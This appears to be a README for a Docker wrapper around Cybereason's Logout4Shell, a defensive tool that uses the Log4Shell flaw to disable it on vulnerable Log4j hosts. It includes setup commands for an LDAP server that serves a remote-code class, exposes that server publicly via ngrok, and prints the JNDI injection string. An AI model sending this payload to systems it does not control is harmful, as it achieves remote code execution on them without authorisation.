## Log4j Docker Vaccine

A containerized way to run the log4j vaccine offered by Cyberreason

- https://github.com/Cybereason/Logout4Shell

### Make it go
Clone this repo:

```bash
git clone https://github.com/jeffbryner/log4j-docker-vaccine.git
```

Build and run the containers:

```bash
docker-compose -f docker-compose.yml -p vaccine up
```

You now have a listening ldap server that will serve up the Log4jRCE class to innoculate a vulnerable log4j instance.

You can expose this to the internet (if you like) by using ngrok.
 - https://dashboard.ngrok.com/get-started/setup

 ```bash
 ngrok tcp 1389
 ```

 You can send a vulnerable log4j instance to this using the infamous jndi input string:
 ```
 ${jndi:ldap://<ngrokurlgoeshere>:1389/a}
 ```
